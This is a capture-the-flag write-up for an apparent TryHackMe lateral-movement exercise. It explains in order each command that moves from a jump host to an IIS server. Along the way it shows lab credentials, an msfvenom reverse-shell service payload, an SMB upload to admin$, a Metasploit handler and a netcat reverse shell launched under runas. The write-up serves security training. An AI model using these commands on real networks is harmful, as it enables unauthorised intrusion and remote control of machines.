### Question 1 — After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?

Credentials were issued for this exercise:

```
Username: gordon.yates
Password: O3OrstsQEev
```

These give SSH access to THMJMP2 as the foothold host. From there, the goal was to move laterally to THMIIS using `sc.exe`, reusing `t1_leonard.summers`'s already-compromised administrative credentials (`EZpass4ever`) to create and run a service there.

First, a service-compatible reverse shell payload was built with `msfvenom`:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=—REDACTED— LPORT=4444 -o anonservice.exe 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 355 bytes
Final size of exe-service file: 5120 bytes
Saved as: anonservice.exe
```

**Breakdown:**

- `msfvenom` generates a standalone payload
- `-p windows/shell/reverse_tcp` selects a Windows reverse shell payload over TCP
- `-f exe-service` outputs the payload wrapped in a service-compatible executable, so the Service Control Manager won't kill it the way it would an ordinary `.exe`
- `LHOST=—REDACTED—` is the attacker's VPN tunnel address, to connect back to
- `LPORT=4444` is the port to connect back to
- `-o anonservice.exe` writes the generated payload to `anonservice.exe`

The payload was then uploaded to THMIIS's `admin$` share using `t1_leonard.summers`'s credentials:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ smbclient -c 'put anonservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever 

putting file anonservice.exe as \anonservice.exe (26.2 kB/s) (average 26.2 kB/s)
```

**Breakdown:**

- `smbclient` connects to the SMB share
- `-c 'put anonservice.exe'` runs a single command against the share, uploading the local payload
- `-U t1_leonard.summers` is the username to authenticate as
- `-W ZA` is the Windows domain that account belongs to
- `'//thmiis.za.tryhackme.com/admin$/'` is the target share path
- `EZpass4ever` is that account's password

With the payload in place, a Metasploit handler was started to catch the callback once the service ran:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ msfconsole -q                                                                                        

[*] Starting persistent handler(s)...
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST lateralmovement
LHOST => —REDACTED—
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444    
msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on —REDACTED—:4444 
```

**Breakdown:**

- `msfconsole -q` launches Metasploit quietly, without the startup banner
- `use exploit/multi/handler` selects the generic listener module, which waits for a payload's callback rather than exploiting anything itself
- `set LHOST lateralmovement` sets the local interface to listen on, by its interface name
- `set LPORT 4444` sets the local port to listen on, matching the port the payload was built with
- `set payload windows/shell/reverse_tcp` tells the handler which payload type to expect, matching `anonservice.exe`
- `exploit` starts the handler, which then waits

`sc.exe` has no way to pass credentials directly, so running the service remotely needed a shell running under `t1_leonard.summers`'s own access token first. Since only an SSH session as `gordon.yates` was available on THMJMP2, that meant spawning a second reverse shell authenticated as `t1_leonard.summers`, caught on a different port:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ nc -lvnp 4443                

listening on [any] 4443 ...
```

**Breakdown:**

- `nc` is Netcat
- `-l` puts it into listen mode
- `-v` makes it verbose
- `-n` skips DNS resolution
- `-p 4443` sets the local listening port

```cmd
za\gordon.yates@THMJMP2 C:\Users\gordon.yates>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe —REDACTED— 4443"                                                                                                         

Enter the password for ZA.TRYHACKME.COM\t1_leonard.summers:                                                                     
Attempting to start c:\tools\nc64.exe -e cmd.exe —REDACTED— 4443 as user "ZA.TRYHACKME.COM\t1_leonard.summers" ... 
```

**Breakdown:**

- `runas` runs a program as a different user
- `/netonly` tells `runas` the supplied credentials are only used for network authentication, not validated against the domain controller locally
- `/user:ZA.TRYHACKME.COM\t1_leonard.summers` is the account whose token the new process should carry
- `"c:\tools\nc64.exe -e cmd.exe —REDACTED— 4443"` runs Netcat with that token, executing (`-e`) `cmd.exe` and connecting it back to the attacker's address and port — a second reverse shell
